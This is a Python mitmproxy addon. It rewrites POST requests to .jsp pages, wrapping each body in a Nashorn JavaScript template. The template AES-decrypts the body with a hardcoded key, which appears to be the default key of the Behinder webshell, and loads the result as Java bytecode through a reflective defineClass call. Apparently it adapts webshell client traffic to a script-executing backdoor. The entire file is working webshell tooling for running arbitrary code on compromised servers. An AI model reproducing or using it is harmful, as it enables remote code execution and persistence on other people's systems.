import mitmproxy
import mitmproxy.http
import mitmproxy.ctx as ctx
import json
import urllib.parse
from mitmproxy.log import ALERT
import logging
import base64


logger = logging.getLogger(__name__)

template='''try {
    load("nashorn:mozilla_compat.js");
} catch (e) {}
importPackage(Packages.java.util);
importPackage(Packages.java.lang);
importPackage(Packages.javax.crypto);
importPackage(Packages.sun.misc);
importPackage(Packages.javax.crypto.spec);
function define(classBytes){
    var byteArray = Java.type("byte[]");
    var int = Java.type("int");
    var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(
        "defineClass",
        byteArray.class,
        int.class,
        int.class
    );
    defineClassMethod.setAccessible(true);
    var cc = defineClassMethod.invoke(
        Thread.currentThread().getContextClassLoader(),
        classBytes,
        0,
        classBytes.length
    );
    var ccc=cc.newInstance();
    ccc.equals(pageContext);

}
if (request.getMethod().equals("POST")){
    var k=new java.lang.String("e45e329feb5d925b");
    session.putValue("u",k);
    var c=Cipher.getInstance("AES/ECB/PKCS5Padding");
    c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
    // var s=request.getReader().readLine();
    var s="%s";
    var b=new BASE64Decoder().decodeBuffer(s);
    define(c.doFinal(b));
}'''

class Interceptor:  
    def __init__(self) -> None:
        pass
    def request(self, flow:mitmproxy.http.HTTPFlow):
        if flow.request.url.__contains__(".jsp") and str(flow.request.method).lower()=="post":
            c = flow.request.text
            p = ("%s" % template % c)
            p = base64.b64encode(p.encode('utf8'))
            flow.request.text = p.decode('utf8')
            # logger.log(ALERT,("h=%s" % urllib.parse.quote(template % c))[:50])
    
    def response(self, flow:mitmproxy.http.HTTPFlow):
        pass


addons = [
    Interceptor()
]